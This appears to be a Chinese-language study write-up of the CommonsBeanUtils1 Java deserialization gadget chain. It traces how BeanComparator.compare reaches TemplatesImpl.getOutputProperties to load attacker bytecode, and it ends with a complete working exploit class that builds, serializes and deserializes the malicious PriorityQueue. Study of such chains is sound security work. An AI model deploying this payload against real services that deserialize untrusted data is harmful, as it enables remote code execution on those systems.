# CommonsBeanUtils1 Analyze

# 0x00

首先在学习这条链子之前我们需要学习一下`JavaBean`​这个概念

1. ​`JavaBean`​是一种符合命名规定的`class`​,它通过`getter`​和`setter`​来定义属性
2. 属性是一种通用的叫法,并非`Java`​语法规定
3. 可以使用`Introspector.getBeanInfor()`​可以获取属性列表
4. 用`@Lombok`​的注解也是同样的,使用`@Lombok`​的注解不需要写`getter`​和`setter`​

而`CommonsBeanUtils`​我们可以理解为一个操控`JavaBean`​类的`Utils`​

​`CommonsBeanUtils`​提供了一个静态方法`PropertyUtils.getProperty()`​,可以调用任意`JavaBean`​类的`getter`​方法

# 0x01

链尾是通过动态加载`TemplateSImpl`​的字节码来实现`rce`​的

而我们动态加载`TemplateSImpl`​的利用流程是这样的

```java
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->

TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()

-> TransletClassLoader#defineClass()
```

而在这条链子的最开头是`getOutputProperties()`​这个方法,它是一个`getter`​方法,而且他的作用域是`public`​,所以我们可以直接用`CommonsBeanUtils`​提供的`PropertyUtils.getProperty()`​来调用

```java
    public synchronized Properties getOutputProperties() {
        try {
            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
```

```java
// 伪代码
PropertyUtils.getProperty(TemplatesImpl, outputProperties)
```

那么继续往上寻找

通过`find usage`​查找,可以找到一个在`BeanComparator`​类中的方法`compare()`​

```java
  public int compare(T o1, T o2) {
    if (this.property == null)
      return internalCompare(o1, o2); 
    try {
      Object value1 = PropertyUtils.getProperty(o1, this.property);
      Object value2 = PropertyUtils.getProperty(o2, this.property);
      return internalCompare(value1, value2);
    } catch (IllegalAccessException iae) {
      throw new RuntimeException("IllegalAccessException: " + iae.toString());
    } catch (InvocationTargetException ite) {
      throw new RuntimeException("InvocationTargetException: " + ite.toString());
    } catch (NoSuchMethodException nsme) {
      throw new RuntimeException("NoSuchMethodException: " + nsme.toString());
    } 
  }
```

找到`compare()`​方法就方便很多了,因为我们在学习`cc4`​的时候就正好用到了这个方法

然后再往上的部分就和`cc4`​是一模一样了

直接来看到`exp`​

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB1 {
    public static void main(String[] args) throws Exception {
        exp();
    }
    public static void exp() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Calc");
        byte[] code = Files.readAllBytes(Paths.get("exp"));
        setFieldValue(templates, "_bytecode", new byte[][]{code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator bc = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, bc);
        queue.add(1);
        queue.add(2);

        setFieldValue(bc, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        serialize(queue);
        unserialize("ser.bin");

    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }


    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

参考文章:

https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x06-%E5%B0%8F%E7%BB%93#​

‍
